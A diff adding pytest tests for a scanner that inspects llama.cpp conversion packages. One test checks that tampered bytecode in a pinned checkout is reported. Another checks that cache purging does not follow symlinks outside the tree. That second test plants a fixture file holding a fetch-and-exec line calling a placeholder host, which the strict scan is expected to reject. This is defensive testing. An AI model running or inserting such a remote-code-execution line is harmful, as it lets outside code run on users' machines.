@@ -1993,6 +1993,76 @@ def test_gguf_py_is_planned_as_an_import_root_and_walked_once(tmp_path):
     assert "util.py" in walk.names
 
 
+def test_a_pinned_checkouts_bytecode_is_reported_since_it_is_not_removed(
+    tmp_path, monkeypatch, caplog
+):
+    """Not deleting it does not make it harmless.
+
+    For a pin this scan leaves the user's files alone, and a cache left in place
+    executes instead of the source beside it whatever that source says. Skipping
+    the deletion AND the report meant a stale or tampered pinned checkout ran
+    with nothing said at all, which is the opposite of what a pin is for.
+    """
+    llama_cpp = _load("llama_cpp_pinned_report_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    cache = root / "conversion" / "__pycache__"
+    cache.mkdir()
+    theirs = cache / "base.cpython-313.pyc"
+    theirs.write_bytes(_pyc(0))
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        # Reported, never refused: strict mode does not block a file the user chose.
+        llama_cpp._scan_conversion_package(str(root), is_local_copy = True)
+    assert any("cannot read" in record.message for record in caplog.records), (
+        [r.message for r in caplog.records]
+    )
+    assert theirs.exists(), "a pinned checkout must still not be rewritten"
+
+    # Downloaded bytes are purged instead, so there is nothing left to report.
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root), is_local_copy = False)
+    assert not theirs.exists()
+    assert not [r for r in caplog.records if "cannot read" in r.message]
+
+
+def test_the_purge_does_not_follow_a_symlink_out_of_the_tree(tmp_path, monkeypatch):
+    """The scan follows a symlink out of the package because the converter's
+    import would, and reading is harmless. Deleting is not: a checkout can carry
+    a symlink at an unrelated directory, and clearing caches there rewrites
+    something that has nothing to do with this export.
+    """
+    llama_cpp = _load("llama_cpp_purge_escape_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    outside = tmp_path / "somebody-elses-project"
+    (outside / "__pycache__").mkdir(parents = True)
+    (outside / "mod.py").write_text("X = 1\n", encoding = "utf-8")
+    theirs = outside / "__pycache__" / "mod.cpython-313.pyc"
+    theirs.write_bytes(_pyc(0))
+    try:
+        (root / "conversion" / "linked").symlink_to(outside, target_is_directory = True)
+    except (OSError, NotImplementedError):
+        pytest.skip("this filesystem does not allow creating directory symlinks")
+
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    llama_cpp._purge_imported_package_bytecode(str(root))
+    assert theirs.exists(), "the purge reached outside the checkout it was given"
+
+    # The scan still reads through the link, which is the half that must not change.
+    (outside / "payload.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
 def _package_root(tmp_path):
     root = tmp_path / "llama.cpp"
     conversion = root / "conversion"
